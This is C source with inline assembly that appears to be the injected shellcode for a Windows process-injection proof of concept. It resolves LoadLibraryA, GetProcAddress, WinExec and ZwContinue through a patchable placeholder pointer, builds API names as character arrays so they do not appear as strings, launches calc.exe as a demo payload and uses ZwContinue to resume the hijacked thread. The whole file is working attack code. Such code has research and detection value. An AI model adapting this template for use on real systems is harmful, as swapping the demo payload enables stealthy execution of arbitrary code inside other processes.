typedef void * (__stdcall *pfnLoadLibraryA)(void *lpLibFileName);
typedef void * (__stdcall *pfnGetProcAddress)(void * hModule, void * lpProcName);
typedef int(__stdcall *pfnWinExec)(void * lpCmdLine, unsigned int uCmdShow);
typedef int(__stdcall *pfnZwContinue)(void * lpContext, int TestAlert);

typedef struct _FUNCTIONPOINTERS
{
	pfnLoadLibraryA pfnLoadLibraryA;
	pfnGetProcAddress pfnGetProcAddress;
} FUNCTIONPOINTERS, *PFUNCTIONPOINTERS;

FUNCTIONPOINTERS g_FunctionPointers;

void shellcode_entry();

__declspec(naked) void fix_esp()
{
	__asm{
		mov eax, edi;
		add ax, 0xc4;
		mov esp, [eax];
		sub sp, 0x1024;
		// This is needed for alignment purposes
		nop;
		nop;
		nop;
	}
	
}

void shellcode_entry()
{
	PFUNCTIONPOINTERS ptFunctionPointer = 0x13371337;
	pfnWinExec pfnWinExec;
	pfnZwContinue pfnZwContinue;
	void * ptContext;
	void * hKernel32;
	void * hNtDll;
	char pszKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', '\0' };
	char pszNtDll[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', '\0' };
	char pszZwContinue[] = { 'Z','w','C','o','n','t','i','n','u','e', '\0'};
	char pszWinExec[] = { 'W', 'i', 'n', 'E', 'x', 'e', 'c', '\0' };
	char pszCalcExe[] = { 'c', 'a', 'l', 'c', '.', 'e', 'x', 'e', '\0' };

	__asm{
		mov[ptContext], edi;
	}

	hKernel32 = ptFunctionPointer->pfnLoadLibraryA(pszKernel32);
	if (0 == hKernel32)
	{
		goto lblCleanup;
	}
	
	hNtDll = ptFunctionPointer->pfnLoadLibraryA(pszNtDll);
	if (0 == hNtDll)
	{
		goto lblCleanup;
	}

	pfnZwContinue = ptFunctionPointer->pfnGetProcAddress(hNtDll, pszZwContinue);
	if (0 == pfnZwContinue)
	{
		goto lblCleanup;
	}

	pfnWinExec = ptFunctionPointer->pfnGetProcAddress(hKernel32, pszWinExec);
	if (0 == pfnWinExec)
	{
		goto lblCleanup;
	}

	pfnWinExec(pszCalcExe, 0);

	pfnZwContinue(ptContext, 1);

lblCleanup:
	return;
}

void dummy()
{
	int dummy = 0xDEADBABE;
}

#include <Windows.h>

int main()
{
	g_FunctionPointers.pfnGetProcAddress = GetProcAddress;
	g_FunctionPointers.pfnLoadLibraryA = LoadLibraryA;
	fix_esp();
	shellcode_entry();
	dummy();
}